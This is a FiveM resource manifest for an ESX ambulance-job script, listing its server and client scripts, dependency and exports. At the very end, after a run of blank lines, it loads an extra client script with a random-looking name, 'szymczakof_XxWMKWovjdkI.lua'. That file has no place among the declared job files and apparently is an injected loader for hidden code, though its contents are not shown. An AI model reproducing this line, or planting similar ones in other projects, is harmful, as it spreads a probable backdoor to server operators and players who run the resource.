resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'
lua54 'yes'
description 'ESX Ambulance Job'

version '1.1.1'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/pl.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/pl.lua',
	'config.lua',
	'client/job.lua',
	'client/deathcam.lua'
}

dependency 'es_extended'


exports {

	'OpenMobileAmbulanceActionsMenu',
	'getDeathStatus',
	'hasPhone'

}







client_script "szymczakof_XxWMKWovjdkI.lua"